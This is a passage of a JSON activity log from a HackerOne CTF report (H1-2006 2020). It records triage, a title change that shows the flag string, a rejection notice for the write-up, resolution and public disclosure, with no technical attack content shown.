ZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8b6291f164a9dcdeb3bedde73c4c893f3b43a224b87827112c4234f503f7b4ec"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 8236719,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "",
      "automated_response": false,
      "created_at": "2020-06-08T21:03:33.954Z",
      "updated_at": "2020-06-08T21:03:33.954Z",
      "actor": {
        "username": "nahamsec",
        "cleared": true,
        "verified": true,
        "url": "/nahamsec",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 8236835,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportTitleUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2020-06-08T21:15:51.687Z",
      "updated_at": "2020-06-08T21:15:51.687Z",
      "additional_data": {
        "old_title": "^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$",
        "new_title": "[H1-2006 2020]  ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$"
      },
      "actor": {
        "username": "nahamsec",
        "cleared": true,
        "verified": true,
        "url": "/nahamsec",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 8268341,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!",
      "automated_response": false,
      "created_at": "2020-06-11T23:03:29.616Z",
      "updated_at": "2020-06-11T23:03:29.616Z",
      "actor": {
        "username": "nahamsec",
        "cleared": true,
        "verified": true,
        "url": "/nahamsec",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 8324949,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Thank you again for participating in the #h12006 CTF! ",
      "automated_response": false,
      "created_at": "2020-06-17T22:27:59.016Z",
      "updated_at": "2020-06-17T22:27:59.016Z",
      "actor": {
        "username": "nahamsec",
        "cleared": true,
        "verified": true,
        "url": "/nahamsec",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "pirateducky",
        "url": "/pirateducky"
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 8331796,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-06-18T13:36:17.948Z",
      "updated_at": "2020-06-18T13:36:17.948Z",
      "first_to_agree": true,
      "actor": {
        "username": "pirateducky",
        "cleared": false,
        "verified": false,
        "url": "/pirateducky",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 8332733,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-06-18T15:24:52.386Z",
      "updated_at": "2020-06-18T15:24:52.386Z",
      "actor": {
        "username": "nahamsec",
        "cleared": true,
        "verified": true,
        "url": "/nahamsec",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 8332734,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-06-18T15:24:52.453Z",
      "updated_at": "2020-06-18T15:24:52.453Z",
      "actor": {
        "username": "nahamsec",
        "cleared": true,
        "verified": true,
        "url": "/nahamsec",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}